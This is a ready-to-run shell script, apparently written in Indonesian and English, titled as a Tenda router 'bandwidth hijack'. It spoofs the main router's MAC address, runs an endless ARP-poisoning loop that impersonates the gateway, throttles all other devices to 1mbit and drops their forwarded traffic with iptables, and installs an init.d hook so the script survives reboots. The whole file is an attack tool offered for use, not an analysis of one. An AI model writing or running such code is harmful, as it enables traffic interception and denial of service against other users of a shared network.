#!/bin/sh
# ============================================
# TENDA BANDWIDTH HIJACK v4.0 - 50% HIJACK
# Firmware: V1.0.0.3(6754)
# ============================================

# CONFIGURASI DARI DATA BOSS
ROUTER_MAIN_IP="192.168.1.1"
ROUTER_MAIN_MAC="F4:2D:06:BF:A9:AA"
OUR_MAC="50:0F:F5:BC:66:C8"
OUR_IP="192.168.2.1"
WAN_IFACE="wlan0"
LAN_IFACE="eth0"

echo "[🚀] TENDA 50% BANDWIDTH HIJACK ACTIVATED!"
echo "[🎯] Target: F670L ($ROUTER_MAIN_MAC)"
echo "[💀] Taking 50% bandwidth for Tenda!"

# 1. MAC SPOOFING
ifconfig $WAN_IFACE down
ip link set $WAN_IFACE address $ROUTER_MAIN_MAC
ifconfig $WAN_IFACE up
sleep 2

# 2. ARP POISONING - HIJACK SEMUA DEVICE
while true; do
    arping -c 1 -U -s $ROUTER_MAIN_IP -I $WAN_IFACE 192.168.1.255 >/dev/null 2>&1
    echo "192.168.1.1 0x1 0x2 $ROUTER_MAIN_MAC $WAN_IFACE" > /proc/net/arp 2>/dev/null
    sleep 10
done &

# 3. 50% BANDWIDTH HIJACK
tc qdisc del dev $LAN_IFACE root 2>/dev/null
tc qdisc add dev $LAN_IFACE root handle 1: htb default 666
tc class add dev $LAN_IFACE parent 1: classid 1:1 htb rate 50mbit ceil 50mbit  # 50% untuk TENDA
tc class add dev $LAN_IFACE parent 1: classid 1:2 htb rate 1mbit ceil 1mbit    # Sisa untuk device lain
tc filter add dev $LAN_IFACE protocol ip parent 1: prio 1 u32 match ether src $OUR_MAC flowid 1:1

# 4. THROTTLE DEVICE LAIN
iptables -F
iptables -A FORWARD -m mac --mac-source ! $OUR_MAC -m limit --limit 50/sec -j ACCEPT
iptables -A FORWARD -m mac --mac-source ! $OUR_MAC -j DROP

# 5. PERSISTENCE - AUTO RESTART
cat > /etc/init.d/tenda_50 << 'EOF'
#!/bin/sh /etc/rc.common
START=99
start() { /etc/tenda_hijack.sh & }
EOF
chmod +x /etc/init.d/tenda_50
/etc/init.d/tenda_50 enable

echo "[✅] 50% BANDWIDTH HIJACK SUCCESS!"
echo "[📊] Tenda: 50Mbps | Other devices: 1Mbps"
while true; do sleep 3600; done